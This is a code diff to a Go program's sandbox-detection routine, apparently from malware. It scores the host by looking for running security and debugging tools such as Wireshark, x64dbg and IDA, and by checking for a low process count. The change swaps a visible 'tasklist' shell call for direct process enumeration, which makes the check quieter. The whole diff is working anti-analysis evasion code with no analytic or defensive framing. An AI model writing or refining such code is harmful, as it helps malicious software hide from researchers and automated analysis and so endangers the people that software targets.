@@ -1,7 +1,6 @@
 package main
 
 import (
-	"context"
 	crypto_rand "crypto/rand"
 	"encoding/binary"
 	"math/rand"
@@ -54,31 +53,24 @@ func isSandbox() bool {
 		}
 	}
 
-	// Check for common analysis tool processes (Windows)
+	// Check for analysis tool processes and low process count (Windows)
 	if runtime.GOOS == "windows" {
 		suspiciousProcs := []string{
 			"wireshark", "procmon", "x64dbg", "x32dbg", "ollydbg",
 			"ida", "ida64", "pestudio", "processhacker", "fiddler",
 			"charles", "apimonitor", "tcpdump", "dumpcap",
 		}
-		// Read tasklist without spawning visible cmd
-		out, err := runCommand(context.Background(), "cmd", "/C", "tasklist /FO CSV /NH")
-		if err == nil {
-			lower := strings.ToLower(string(out))
-			for _, proc := range suspiciousProcs {
-				if strings.Contains(lower, proc) {
+		procs := enumerateProcessNames()
+		for _, name := range procs {
+			lower := strings.ToLower(name)
+			for _, suspect := range suspiciousProcs {
+				if strings.Contains(lower, suspect) {
 					score += 20
 					break
 				}
 			}
 		}
-	}
-
-	// Low process count indicates sandbox
-	if runtime.GOOS == "windows" {
-		out, _ := runCommand(context.Background(), "cmd", "/C", "tasklist /NH")
-		procCount := strings.Count(string(out), "\n")
-		if procCount < 30 {
+		if len(procs) < 30 {
 			score += 20
 		}
 	}
